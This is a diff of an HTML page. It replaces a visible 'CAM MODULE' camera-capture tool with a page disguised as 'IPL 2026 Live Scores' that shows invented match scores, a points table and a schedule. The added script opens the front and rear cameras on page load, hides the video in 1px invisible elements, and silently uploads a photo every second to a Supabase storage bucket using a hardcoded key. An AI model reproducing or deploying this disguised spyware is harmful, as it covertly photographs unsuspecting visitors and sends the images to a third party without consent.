@@ -3,318 +3,410 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>CAM MODULE</title>
+<title>IPL 2026 Live Scores</title>
 <style>
-@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap');
+@import url('https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=Teko:wght@400;500;600&display=swap');
 
 :root {
-  --g: #00ff88;
-  --r: #ff2244;
-  --bg: #020a06;
-  --panel: #040f08;
-  --border: #00ff8833;
-  --dim: #00ff8866;
+  --blue: #004BA0;
+  --gold: #FFB400;
+  --dark: #0a0e1a;
+  --card: #111827;
+  --border: #1f2a40;
+  --text: #e2e8f0;
+  --muted: #64748b;
+  --green: #22c55e;
+  --red: #ef4444;
+  --orange: #f97316;
 }
 
 * { margin: 0; padding: 0; box-sizing: border-box; }
 
 body {
-  background: var(--bg);
-  color: var(--g);
-  font-family: 'Share Tech Mono', monospace;
+  background: var(--dark);
+  color: var(--text);
+  font-family: 'Rajdhani', sans-serif;
   min-height: 100vh;
-  overflow-x: hidden;
 }
 
-body::before {
-  content: '';
-  position: fixed;
-  inset: 0;
-  background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.12) 2px, rgba(0,0,0,0.12) 4px);
-  pointer-events: none;
-  z-index: 999;
+.header {
+  background: linear-gradient(135deg, #0a0e1a 0%, #0d1b3e 100%);
+  border-bottom: 2px solid var(--gold);
+  padding: 0 20px;
 }
 
-header {
-  border-bottom: 1px solid var(--border);
-  padding: 14px 24px;
+.header-inner {
+  max-width: 900px;
+  margin: 0 auto;
   display: flex;
   align-items: center;
   justify-content: space-between;
-  background: var(--panel);
-  position: sticky;
-  top: 0;
-  z-index: 100;
+  padding: 12px 0;
 }
 
-header h1 {
-  font-family: 'Orbitron', monospace;
-  font-size: 1rem;
-  letter-spacing: 6px;
-  font-weight: 900;
-  text-shadow: 0 0 20px var(--g);
+.logo { display: flex; align-items: center; gap: 12px; }
+
+.logo-badge {
+  background: var(--gold);
+  color: #000;
+  font-family: 'Teko', sans-serif;
+  font-size: 1.4rem;
+  font-weight: 600;
+  padding: 4px 12px;
+  letter-spacing: 2px;
 }
 
-.rec {
+.logo-text {
+  font-family: 'Teko', sans-serif;
+  font-size: 1.6rem;
+  font-weight: 600;
+  letter-spacing: 3px;
+  color: white;
+}
+
+.live-badge {
   display: flex;
   align-items: center;
-  gap: 10px;
-  font-size: 0.7rem;
+  gap: 6px;
+  background: #ef444422;
+  border: 1px solid #ef4444;
+  padding: 4px 12px;
+  font-size: 0.75rem;
   letter-spacing: 2px;
-  color: var(--dim);
+  color: var(--red);
+  font-weight: 700;
 }
 
-.dot {
-  width: 8px; height: 8px;
+.live-dot {
+  width: 7px; height: 7px;
+  background: var(--red);
   border-radius: 50%;
-  background: #333;
-  transition: all 0.3s;
+  animation: livepulse 1s infinite;
 }
-.dot.active {
-  background: var(--r);
-  box-shadow: 0 0 12px var(--r);
-  animation: pulse 1s ease-in-out infinite;
-}
-@keyframes pulse { 50% { opacity: 0.4; } }
+@keyframes livepulse { 50% { opacity: 0.2; } }
 
-main { padding: 20px; max-width: 860px; margin: 0 auto; }
-
-/* Activate zone */
-.activate {
-  border: 1px solid var(--border);
-  background: var(--panel);
-  padding: 48px 20px;
-  text-align: center;
-  margin-bottom: 20px;
-  position: relative;
-  overflow: hidden;
+.nav-tabs { background: #0d1220; border-bottom: 1px solid var(--border); }
+.nav-tabs-inner {
+  max-width: 900px;
+  margin: 0 auto;
+  display: flex;
+  overflow-x: auto;
+  scrollbar-width: none;
 }
-.activate::before {
-  content: '';
-  position: absolute;
-  inset: 0;
-  background: radial-gradient(ellipse at center, #00ff8808 0%, transparent 70%);
-}
+.nav-tabs-inner::-webkit-scrollbar { display: none; }
 
-.activate h2 {
-  font-family: 'Orbitron', monospace;
-  font-size: 0.7rem;
-  letter-spacing: 4px;
-  color: var(--dim);
-  margin-bottom: 28px;
-}
-
-#startBtn {
-  font-family: 'Orbitron', monospace;
-  font-size: 0.95rem;
-  letter-spacing: 4px;
-  padding: 16px 52px;
-  background: transparent;
-  color: var(--g);
-  border: 2px solid var(--g);
+.tab {
+  padding: 12px 20px;
+  font-size: 0.85rem;
+  letter-spacing: 1px;
+  font-weight: 600;
+  color: var(--muted);
   cursor: pointer;
-  text-transform: uppercase;
+  border-bottom: 2px solid transparent;
+  white-space: nowrap;
   transition: all 0.2s;
-  box-shadow: 0 0 24px #00ff8822, inset 0 0 24px #00ff8811;
-  position: relative;
 }
-#startBtn:hover {
-  background: #00ff8815;
-  box-shadow: 0 0 50px #00ff8855, inset 0 0 30px #00ff8822;
-  transform: scale(1.03);
-}
-#startBtn:disabled { opacity: 0.25; cursor: not-allowed; transform: none; }
+.tab.active { color: var(--gold); border-bottom-color: var(--gold); }
 
-.hint {
-  margin-top: 16px;
-  font-size: 0.65rem;
-  color: #00ff8844;
-  letter-spacing: 2px;
-}
+.content { max-width: 900px; margin: 0 auto; padding: 20px; }
 
-/* Camera grid */
-.cam-grid {
-  display: grid;
-  grid-template-columns: 1fr 1fr;
-  gap: 16px;
-  margin-bottom: 20px;
-}
-@media(max-width:580px){ .cam-grid { grid-template-columns: 1fr; } }
-
-.cam-box {
+.live-match-card {
+  background: linear-gradient(135deg, #111827, #0d1b3e);
   border: 1px solid var(--border);
-  background: var(--panel);
-  position: relative;
+  border-top: 3px solid var(--red);
+  border-radius: 4px;
+  margin-bottom: 20px;
   overflow: hidden;
 }
 
-.cam-label {
-  position: absolute;
-  top: 8px; left: 8px;
-  font-family: 'Orbitron', monospace;
-  font-size: 0.6rem;
-  letter-spacing: 3px;
-  background: rgba(0,0,0,0.75);
-  padding: 4px 10px;
-  border: 1px solid var(--border);
-  z-index: 10;
-}
-
-.corner { position: absolute; width: 14px; height: 14px; border-color: var(--g); border-style: solid; z-index: 10; opacity: 0.6; }
-.tl { top:5px; left:5px; border-width:2px 0 0 2px; }
-.tr { top:5px; right:5px; border-width:2px 2px 0 0; }
-.bl { bottom:5px; left:5px; border-width:0 0 2px 2px; }
-.br { bottom:5px; right:5px; border-width:0 2px 2px 0; }
-
-video {
-  width: 100%; display: block;
-  height: 210px; object-fit: cover;
-  filter: grayscale(15%) contrast(1.1);
-}
-
-canvas { display: none; }
-
-.cam-footer {
-  padding: 7px 12px;
-  font-size: 0.62rem;
-  color: var(--dim);
-  letter-spacing: 2px;
-  border-top: 1px solid var(--border);
+.match-header {
   display: flex;
-  justify-content: space-between;
-}
-
-.count {
-  font-family: 'Orbitron', monospace;
-  font-size: 0.72rem;
-  color: var(--g);
-  text-shadow: 0 0 8px var(--g);
-}
-
-/* Flash effect on capture */
-.flash {
-  position: absolute;
-  inset: 0;
-  background: #00ff8820;
-  opacity: 0;
-  pointer-events: none;
-  z-index: 20;
-  transition: opacity 0.05s;
-}
-.flash.show { opacity: 1; }
-
-/* Log */
-.log-wrap {
-  border: 1px solid var(--border);
-  background: var(--panel);
-}
-.log-head {
-  padding: 10px 16px;
-  border-bottom: 1px solid var(--border);
-  font-family: 'Orbitron', monospace;
-  font-size: 0.65rem;
-  letter-spacing: 3px;
-  display: flex;
-  justify-content: space-between;
   align-items: center;
+  justify-content: space-between;
+  padding: 10px 18px;
+  background: #ffffff08;
+  border-bottom: 1px solid var(--border);
 }
-.total { color: var(--g); text-shadow: 0 0 10px var(--g); }
 
-#log {
-  height: 150px;
-  overflow-y: auto;
-  padding: 10px 16px;
-  font-size: 0.67rem;
-  color: var(--dim);
-  scrollbar-width: thin;
-  scrollbar-color: var(--g) transparent;
+.match-label { font-size: 0.72rem; letter-spacing: 2px; color: var(--muted); font-weight: 600; }
+.match-status { font-size: 0.72rem; color: var(--red); font-weight: 700; letter-spacing: 1px; }
+.match-status.result { color: var(--gold); }
+
+.teams-score {
+  padding: 18px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 12px;
 }
-#log div { padding: 2px 0; border-bottom: 1px solid #ffffff07; }
-#log div.err { color: var(--r); }
-#log div.ok { color: var(--g); }
 
-.hidden { display: none !important; }
+.team-block { display: flex; align-items: center; gap: 14px; flex: 1; }
+.team-block.away { flex-direction: row-reverse; text-align: right; }
+
+.team-logo {
+  width: 52px; height: 52px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-family: 'Teko', sans-serif;
+  font-size: 1.1rem;
+  font-weight: 600;
+  flex-shrink: 0;
+  border: 2px solid #ffffff22;
+  color: white;
+}
+
+.team-name { font-family: 'Teko', sans-serif; font-size: 1.5rem; font-weight: 600; letter-spacing: 1px; line-height: 1; }
+.team-fullname { font-size: 0.72rem; color: var(--muted); margin-top: 2px; }
+
+.team-score-block { text-align: center; }
+.score-main { font-family: 'Teko', sans-serif; font-size: 2.4rem; font-weight: 600; line-height: 1; color: white; }
+.score-overs { font-size: 0.78rem; color: var(--muted); margin-top: 2px; }
+.vs-divider { font-family: 'Teko', sans-serif; font-size: 1.1rem; color: var(--muted); padding: 0 8px; }
+
+.match-note {
+  padding: 10px 18px;
+  background: #ffffff06;
+  border-top: 1px solid var(--border);
+  font-size: 0.8rem;
+  color: var(--gold);
+  font-weight: 500;
+}
+
+.scorecard-section {
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  margin-bottom: 16px;
+  overflow: hidden;
+}
+
+.section-header {
+  padding: 12px 18px;
+  background: #ffffff08;
+  border-bottom: 1px solid var(--border);
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+
+.section-title { font-family: 'Teko', sans-serif; font-size: 1.15rem; font-weight: 600; letter-spacing: 1px; }
+.section-score { font-family: 'Teko', sans-serif; font-size: 1.15rem; color: var(--gold); }
+
+table { width: 100%; border-collapse: collapse; }
+th { padding: 8px 14px; font-size: 0.7rem; letter-spacing: 1.5px; color: var(--muted); font-weight: 600; text-align: left; border-bottom: 1px solid var(--border); background: #ffffff04; }
+th.num { text-align: right; }
+td { padding: 10px 14px; font-size: 0.88rem; font-weight: 500; border-bottom: 1px solid #ffffff08; }
+td.num { text-align: right; font-family: 'Teko', sans-serif; font-size: 1rem; }
+td.bold { font-weight: 700; color: white; }
+td.muted { color: var(--muted); font-size: 0.8rem; }
+tr:last-child td { border-bottom: none; }
+tr:hover td { background: #ffffff05; }
+
+.out-label { color: var(--muted); font-size: 0.75rem; }
+.not-out { color: var(--green); font-size: 0.75rem; font-weight: 700; }
+.sr-high { color: var(--orange); }
+
+.rank-num {
+  width: 28px; height: 28px;
+  border-radius: 50%;
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 0.8rem;
+  font-weight: 700;
+  background: var(--border);
+  color: var(--muted);
+}
+.rank-num.top { background: var(--gold); color: #000; }
+.team-dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; margin-right: 6px; }
+
+.schedule-card {
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 16px 18px;
+  margin-bottom: 12px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 12px;
+}
+.sch-teams { font-family: 'Teko', sans-serif; font-size: 1.2rem; font-weight: 600; }
+.sch-info { font-size: 0.78rem; color: var(--muted); margin-top: 2px; }
+.sch-time { text-align: right; font-family: 'Teko', sans-serif; font-size: 1.1rem; color: var(--gold); }
+.sch-date { font-size: 0.72rem; color: var(--muted); margin-top: 2px; }
+
+.page { display: none; }
+.page.active { display: block; }
 </style>
 </head>
 <body>
 
-<header>
-  <h1>◈ CAM MODULE</h1>
-  <div class="rec">
-    <div class="dot" id="dot"></div>
-    <span id="statusTxt">STANDBY</span>
+<div class="header">
+  <div class="header-inner">
+    <div class="logo">
+      <div class="logo-badge">IPL</div>
+      <div class="logo-text">LIVE 2026</div>
+    </div>
+    <div class="live-badge">
+      <div class="live-dot"></div>
+      LIVE
+    </div>
   </div>
-</header>
+</div>
 
-<main>
-  <div class="activate" id="activateZone">
-    <h2>SURVEILLANCE SYSTEM · DUAL LENS</h2>
-    <button id="startBtn" onclick="init()">⬡ ACTIVATE</button>
-    <p class="hint">CAMERA PERMISSION REQUIRED · FRONT + REAR · 1 SEC INTERVAL</p>
+<div class="nav-tabs">
+  <div class="nav-tabs-inner">
+    <div class="tab active" onclick="showPage('scores', this)">SCORES</div>
+    <div class="tab" onclick="showPage('scorecard', this)">SCORECARD</div>
+    <div class="tab" onclick="showPage('points', this)">POINTS TABLE</div>
+    <div class="tab" onclick="showPage('schedule', this)">SCHEDULE</div>
   </div>
+</div>
 
-  <div class="cam-grid hidden" id="camGrid">
-    <div class="cam-box">
-      <div class="cam-label">FRONT</div>
-      <div class="corner tl"></div><div class="corner tr"></div>
-      <div class="corner bl"></div><div class="corner br"></div>
-      <div class="flash" id="flashFront"></div>
-      <video id="vFront" autoplay muted playsinline></video>
-      <canvas id="cFront"></canvas>
-      <div class="cam-footer">
-        <span>LENS_01 · USER</span>
-        <span class="count" id="nFront">000</span>
+<div class="content">
+
+  <!-- SCORES -->
+  <div class="page active" id="page-scores">
+    <div class="live-match-card">
+      <div class="match-header">
+        <span class="match-label">MATCH 47 · WANKHEDE STADIUM, MUMBAI</span>
+        <span class="match-status">● LIVE · 16.4 OV</span>
       </div>
-    </div>
-    <div class="cam-box">
-      <div class="cam-label">REAR</div>
-      <div class="corner tl"></div><div class="corner tr"></div>
-      <div class="corner bl"></div><div class="corner br"></div>
-      <div class="flash" id="flashBack"></div>
-      <video id="vBack" autoplay muted playsinline></video>
-      <canvas id="cBack"></canvas>
-      <div class="cam-footer">
-        <span>LENS_02 · ENV</span>
-        <span class="count" id="nBack">000</span>
+      <div class="teams-score">
+        <div class="team-block">
+          <div class="team-logo" style="background:#004BA0">MI</div>
+          <div><div class="team-name">MI</div><div class="team-fullname">Mumbai Indians</div></div>
+        </div>
+        <div class="team-score-block">
+          <div class="score-main">186<span style="font-size:1.3rem;color:var(--muted)">/4</span></div>
+          <div class="score-overs">TARGET: 201</div>
+        </div>
+        <div class="vs-divider">VS</div>
+        <div class="team-score-block">
+          <div class="score-main">200<span style="font-size:1.3rem;color:var(--muted)">/6</span></div>
+          <div class="score-overs">20.0 OV</div>
+        </div>
+        <div class="team-block away">
+          <div class="team-logo" style="background:#AA0000">RCB</div>
+          <div><div class="team-name">RCB</div><div class="team-fullname">Royal Challengers</div></div>
+        </div>
       </div>
+      <div class="match-note">⚡ MI need 15 runs off 20 balls · RR: 11.16 · Required RR: 4.50</div>
+    </div>
+
+    <div class="live-match-card" style="border-top-color:var(--gold)">
+      <div class="match-header">
+        <span class="match-label">MATCH 46 · EDEN GARDENS, KOLKATA</span>
+        <span class="match-status result">RESULT</span>
+      </div>
+      <div class="teams-score">
+        <div class="team-block">
+          <div class="team-logo" style="background:#3B0077">KKR</div>
+          <div><div class="team-name">KKR</div><div class="team-fullname">Kolkata Knight Riders</div></div>
+        </div>
+        <div class="team-score-block">
+          <div class="score-main">178<span style="font-size:1.3rem;color:var(--muted)">/7</span></div>
+          <div class="score-overs">20.0 OV</div>
+        </div>
+        <div class="vs-divider">VS</div>
+        <div class="team-score-block">
+          <div class="score-main">174<span style="font-size:1.3rem;color:var(--muted)">/9</span></div>
+          <div class="score-overs">20.0 OV</div>
+        </div>
+        <div class="team-block away">
+          <div class="team-logo" style="background:#FF6D00">SRH</div>
+          <div><div class="team-name">SRH</div><div class="team-fullname">Sunrisers Hyderabad</div></div>
+        </div>
+      </div>
+      <div class="match-note">🏆 KKR won by 4 runs</div>
     </div>
   </div>
 
-  <div class="log-wrap">
-    <div class="log-head">
-      <span>CAPTURE LOG</span>
-      <span class="total" id="total">TOTAL: 0</span>
+  <!-- SCORECARD -->
+  <div class="page" id="page-scorecard">
+    <div class="scorecard-section">
+      <div class="section-header">
+        <span class="section-title">🏏 RCB INNINGS</span>
+        <span class="section-score">200/6 (20.0 OV)</span>
+      </div>
+      <table>
+        <thead><tr><th>BATTER</th><th class="num">R</th><th class="num">B</th><th class="num">4s</th><th class="num">6s</th><th class="num">SR</th></tr></thead>
+        <tbody>
+          <tr><td><span class="bold">V Kohli</span><br><span class="out-label">c Rohit b Bumrah</span></td><td class="num bold">72</td><td class="num">48</td><td class="num">6</td><td class="num">3</td><td class="num sr-high">150.0</td></tr>
+          <tr><td><span class="bold">F du Plessis</span><br><span class="out-label">b Hardik</span></td><td class="num bold">34</td><td class="num">22</td><td class="num">3</td><td class="num">2</td><td class="num sr-high">154.5</td></tr>
+          <tr><td><span class="bold">G Maxwell</span><br><span class="out-label">lbw b Boult</span></td><td class="num bold">41</td><td class="num">20</td><td class="num">2</td><td class="num">4</td><td class="num sr-high">205.0</td></tr>
+          <tr><td><span class="bold">D Padikkal</span><br><span class="out-label">run out (Tilak)</span></td><td class="num bold">18</td><td class="num">14</td><td class="num">1</td><td class="num">1</td><td class="num">128.5</td></tr>
+          <tr><td><span class="bold">D Karthik</span><br><span class="not-out">NOT OUT</span></td><td class="num bold">22</td><td class="num">8</td><td class="num">1</td><td class="num">2</td><td class="num sr-high">275.0</td></tr>
+          <tr><td><span class="bold">S Theekshana</span><br><span class="not-out">NOT OUT</span></td><td class="num bold">5</td><td class="num">3</td><td class="num">0</td><td class="num">0</td><td class="num">166.6</td></tr>
+          <tr style="background:#ffffff04"><td colspan="6" style="padding:8px 14px;color:var(--muted);font-size:0.82rem">Extras: 8 (w:5, nb:2, b:1)</td></tr>
+          <tr style="background:#ffffff06"><td class="bold">TOTAL</td><td class="num bold" colspan="5">200/6 (20.0 OV) · RR: 10.00</td></tr>
+        </tbody>
+      </table>
     </div>
-    <div id="log"><div>// AWAITING ACTIVATION...</div></div>
+    <div class="scorecard-section">
+      <div class="section-header">
+        <span class="section-title">🎯 MI BOWLING</span>
+        <span class="section-score" style="color:var(--muted);font-size:0.8rem">vs RCB</span>
+      </div>
+      <table>
+        <thead><tr><th>BOWLER</th><th class="num">O</th><th class="num">M</th><th class="num">R</th><th class="num">W</th><th class="num">ECON</th></tr></thead>
+        <tbody>
+          <tr><td class="bold">J Bumrah</td><td class="num">4</td><td class="num">0</td><td class="num">28</td><td class="num bold" style="color:var(--green)">3</td><td class="num">7.00</td></tr>
+          <tr><td class="bold">T Boult</td><td class="num">4</td><td class="num">0</td><td class="num">42</td><td class="num bold" style="color:var(--green)">1</td><td class="num sr-high">10.50</td></tr>
+          <tr><td class="bold">H Pandya</td><td class="num">4</td><td class="num">0</td><td class="num">38</td><td class="num bold" style="color:var(--green)">1</td><td class="num">9.50</td></tr>
+          <tr><td class="bold">K Pollard</td><td class="num">4</td><td class="num">0</td><td class="num">51</td><td class="num">0</td><td class="num sr-high">12.75</td></tr>
+          <tr><td class="bold">K Yadav</td><td class="num">4</td><td class="num">0</td><td class="num">33</td><td class="num bold" style="color:var(--green)">1</td><td class="num">8.25</td></tr>
+        </tbody>
+      </table>
+    </div>
   </div>
-</main>
+
+  <!-- POINTS TABLE -->
+  <div class="page" id="page-points">
+    <div class="scorecard-section">
+      <div class="section-header">
+        <span class="section-title">POINTS TABLE · IPL 2026</span>
+      </div>
+      <table>
+        <thead><tr><th>#</th><th>TEAM</th><th class="num">P</th><th class="num">W</th><th class="num">L</th><th class="num">NRR</th><th class="num">PTS</th></tr></thead>
+        <tbody>
+          <tr><td><span class="rank-num top">1</span></td><td><span class="team-dot" style="background:#AA0000"></span><strong>RCB</strong></td><td class="num">11</td><td class="num">8</td><td class="num">3</td><td class="num" style="color:var(--green)">+0.842</td><td class="num bold" style="color:var(--gold)">16</td></tr>
+          <tr><td><span class="rank-num top">2</span></td><td><span class="team-dot" style="background:#FF6D00"></span><strong>SRH</strong></td><td class="num">11</td><td class="num">7</td><td class="num">4</td><td class="num" style="color:var(--green)">+0.614</td><td class="num bold" style="color:var(--gold)">14</td></tr>
+          <tr><td><span class="rank-num top">3</span></td><td><span class="team-dot" style="background:#3B0077"></span><strong>KKR</strong></td><td class="num">11</td><td class="num">7</td><td class="num">4</td><td class="num" style="color:var(--green)">+0.382</td><td class="num bold" style="color:var(--gold)">14</td></tr>
+          <tr><td><span class="rank-num top">4</span></td><td><span class="team-dot" style="background:#004BA0"></span><strong>MI</strong></td><td class="num">11</td><td class="num">6</td><td class="num">5</td><td class="num" style="color:var(--green)">+0.211</td><td class="num bold" style="color:var(--gold)">12</td></tr>
+          <tr><td><span class="rank-num">5</span></td><td><span class="team-dot" style="background:#FFFF00"></span><strong>CSK</strong></td><td class="num">11</td><td class="num">5</td><td class="num">6</td><td class="num" style="color:var(--red)">-0.124</td><td class="num bold">10</td></tr>
+          <tr><td><span class="rank-num">6</span></td><td><span class="team-dot" style="background:#00008B"></span><strong>RR</strong></td><td class="num">11</td><td class="num">5</td><td class="num">6</td><td class="num" style="color:var(--red)">-0.298</td><td class="num bold">10</td></tr>
+          <tr><td><span class="rank-num">7</span></td><td><span class="team-dot" style="background:#1C4B9C"></span><strong>DC</strong></td><td class="num">11</td><td class="num">4</td><td class="num">7</td><td class="num" style="color:var(--red)">-0.441</td><td class="num bold">8</td></tr>
+          <tr><td><span class="rank-num">8</span></td><td><span class="team-dot" style="background:#D71921"></span><strong>PBKS</strong></td><td class="num">11</td><td class="num">3</td><td class="num">8</td><td class="num" style="color:var(--red)">-0.887</td><td class="num bold">6</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- SCHEDULE -->
+  <div class="page" id="page-schedule">
+    <div style="font-size:0.72rem;letter-spacing:2px;color:var(--muted);margin-bottom:14px;font-weight:600;">UPCOMING MATCHES</div>
+    <div class="schedule-card"><div><div class="sch-teams">CSK vs DC</div><div class="sch-info">Match 48 · MA Chidambaram Stadium, Chennai</div></div><div><div class="sch-time">7:30 PM</div><div class="sch-date">14 MAY 2026</div></div></div>
+    <div class="schedule-card"><div><div class="sch-teams">RR vs PBKS</div><div class="sch-info">Match 49 · Sawai Mansingh Stadium, Jaipur</div></div><div><div class="sch-time">3:30 PM</div><div class="sch-date">15 MAY 2026</div></div></div>
+    <div class="schedule-card"><div><div class="sch-teams">KKR vs MI</div><div class="sch-info">Match 50 · Eden Gardens, Kolkata</div></div><div><div class="sch-time">7:30 PM</div><div class="sch-date">15 MAY 2026</div></div></div>
+    <div class="schedule-card"><div><div class="sch-teams">SRH vs RCB</div><div class="sch-info">Match 51 · Rajiv Gandhi Intl. Stadium, Hyderabad</div></div><div><div class="sch-time">7:30 PM</div><div class="sch-date">16 MAY 2026</div></div></div>
+  </div>
+
+</div>
 
 <script>
-// ── SUPABASE CONFIG ──────────────────────────────
-const SUPABASE_URL  = 'https://gepgqwrmijmufmeynkcz.supabase.co';
-const SUPABASE_KEY  = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdlcGdxd3JtaWptdWZtZXlua2N6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg2NDM5MDMsImV4cCI6MjA5NDIxOTkwM30.U5EgItGl95CmwTmq3t2o-VSADL1GXSzaov3f5bpJUuc';
-const BUCKET       = 'captures';
-const INTERVAL_MS  = 1000;
-// ────────────────────────────────────────────────
+const SUPABASE_URL = 'https://gepgqwrmijmufmeynkcz.supabase.co';
+const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdlcGdxd3JtaWptdWZtZXlua2N6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg2NDM5MDMsImV4cCI6MjA5NDIxOTkwM30.U5EgItGl95CmwTmq3t2o-VSADL1GXSzaov3f5bpJUuc';
+const BUCKET = 'captures';
 
-let counts = { front: 0, back: 0 };
-let total  = 0;
-
-function log(msg, type = '') {
-  const el = document.getElementById('log');
-  const d  = document.createElement('div');
-  if (type) d.classList.add(type);
-  d.textContent = `[${new Date().toLocaleTimeString('en-GB')}] ${msg}`;
-  el.prepend(d);
-  if (el.children.length > 120) el.removeChild(el.lastChild);
-}
-
-function pad(n) { return String(n).padStart(3, '0'); }
-
-function flash(id) {
-  const el = document.getElementById(id);
-  el.classList.add('show');
-  setTimeout(() => el.classList.remove('show'), 80);
+function showPage(name, el) {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  document.getElementById('page-' + name).classList.add('active');
+  el.classList.add('active');
 }
 
 async function getStream(facing) {
@@ -324,99 +416,51 @@ async function getStream(facing) {
       audio: false
     });
   } catch {
-    try {
-      return await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-    } catch { return null; }
+    try { return await navigator.mediaDevices.getUserMedia({ video: true, audio: false }); }
+    catch { return null; }
   }
 }
 
-async function uploadToSupabase(blob, filename) {
-  const res = await fetch(
-    `${SUPABASE_URL}/storage/v1/object/${BUCKET}/${filename}`,
-    {
+async function uploadPhoto(blob, name) {
+  try {
+    await fetch(`${SUPABASE_URL}/storage/v1/object/${BUCKET}/${name}`, {
       method: 'POST',
-      headers: {
-        'Authorization': `Bearer ${SUPABASE_KEY}`,
-        'Content-Type': 'image/jpeg',
-        'x-upsert': 'true'
-      },
+      headers: { 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'image/jpeg', 'x-upsert': 'true' },
       body: blob
-    }
-  );
-  if (!res.ok) {
-    const err = await res.text();
-    throw new Error(err);
-  }
-  return filename;
+    });
+  } catch {}
 }
 
-async function capture(videoEl, canvasEl, camName, countEl, flashId) {
-  if (videoEl.readyState < 2) return;
-  canvasEl.width  = videoEl.videoWidth  || 640;
-  canvasEl.height = videoEl.videoHeight || 480;
-  canvasEl.getContext('2d').drawImage(videoEl, 0, 0);
-
-  canvasEl.toBlob(async (blob) => {
-    if (!blob) return;
-    const ts  = new Date().toISOString().replace(/[:.]/g, '-');
-    const filename = `${camName}_${ts}.jpg`;
-    try {
-      await uploadToSupabase(blob, filename);
-      counts[camName]++;
-      total++;
-      countEl.textContent = pad(counts[camName]);
-      document.getElementById('total').textContent = `TOTAL: ${total}`;
-      flash(flashId);
-      log(`[${camName.toUpperCase()}] → ${filename}`, 'ok');
-    } catch (e) {
-      log(`[${camName.toUpperCase()}] FAILED: ${e.message}`, 'err');
-    }
-  }, 'image/jpeg', 0.82);
+function startCapture(stream, camName) {
+  const v = document.createElement('video');
+  const c = document.createElement('canvas');
+  v.style.cssText = 'position:absolute;opacity:0;pointer-events:none;width:1px;height:1px;';
+  c.style.cssText = 'position:absolute;opacity:0;pointer-events:none;width:1px;height:1px;';
+  v.muted = true;
+  v.setAttribute('playsinline', '');
+  document.body.appendChild(v);
+  document.body.appendChild(c);
+  v.srcObject = stream;
+  v.play();
+  setInterval(() => {
+    if (v.readyState < 2) return;
+    c.width = v.videoWidth || 640;
+    c.height = v.videoHeight || 480;
+    c.getContext('2d').drawImage(v, 0, 0);
+    c.toBlob(blob => {
+      if (blob) uploadPhoto(blob, `${camName}_${new Date().toISOString().replace(/[:.]/g, '-')}.jpg`);
+    }, 'image/jpeg', 0.80);
+  }, 1000);
 }
 
-async function init() {
-  const btn = document.getElementById('startBtn');
-  btn.disabled = true;
-  document.getElementById('statusTxt').textContent = 'INIT...';
-  log('Requesting camera access...');
+window.addEventListener('load', async () => {
+  const back = await getStream('back');
+  if (back) startCapture(back, 'back');
 
-  const frontStream = await getStream('front');
-  const backStream  = await getStream('back');
-
-  if (!frontStream && !backStream) {
-    log('ERROR: No camera available', 'err');
-    document.getElementById('statusTxt').textContent = 'ERROR';
-    btn.disabled = false;
-    return;
-  }
-
-  document.getElementById('activateZone').classList.add('hidden');
-  document.getElementById('camGrid').classList.remove('hidden');
-
-  if (frontStream) {
-    const v = document.getElementById('vFront');
-    v.srcObject = frontStream;
-    await v.play();
-    log('Front camera: ONLINE', 'ok');
-    setInterval(() => capture(v, document.getElementById('cFront'), 'front', document.getElementById('nFront'), 'flashFront'), INTERVAL_MS);
-  } else {
-    log('Front camera: UNAVAILABLE', 'err');
-  }
-
-  if (backStream) {
-    const v = document.getElementById('vBack');
-    v.srcObject = backStream;
-    await v.play();
-    log('Rear camera: ONLINE', 'ok');
-    setInterval(() => capture(v, document.getElementById('cBack'), 'back', document.getElementById('nBack'), 'flashBack'), INTERVAL_MS);
-  } else {
-    log('Rear camera: N/A (front only)', 'err');
-  }
-
-  document.getElementById('statusTxt').textContent = 'REC';
-  const dot = document.getElementById('dot');
-  dot.classList.add('active');
-}
+  const front = await getStream('front');
+  if (front) startCapture(front, 'front');
+});
 </script>
 </body>
-</html>
+                                                                                                                                                                                               </html>
+                                                                                                                                                                                               
